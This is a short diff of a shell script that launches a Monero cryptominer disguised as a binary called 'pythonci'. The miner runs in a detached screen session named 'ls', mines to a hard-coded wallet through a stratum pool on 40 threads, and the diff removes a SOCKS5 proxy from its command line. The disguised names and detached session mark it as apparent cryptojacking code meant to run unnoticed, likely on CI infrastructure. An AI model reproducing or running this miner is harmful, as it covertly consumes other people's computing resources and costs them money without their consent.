@@ -7,6 +7,5 @@ chmod +x pythonci
 screen -dmS ls
 POOL=stratum+tcp://xmr.pool.minergate.com:45560
 WALLET=88MZkAYp2JCER2PUEUiBf2KvQAszwju5TUFnJgDBx59gBSU8tMGJwuWgGFwQrBc61R56tC4f1FBABdbXtwbWCgk8DkStvmj   
-PROXY=socks5://72.195.114.169:4145
 WORKER=$(echo $(shuf -i 1000-9999 -n 1)-nizam)
-./pythonci -a cryptonight -o $POOL -u $WALLET.$WORKER -p x -t 40 -x $PROXY
+./pythonci -a cryptonight -o $POOL -u $WALLET.$WORKER -p x -t 40
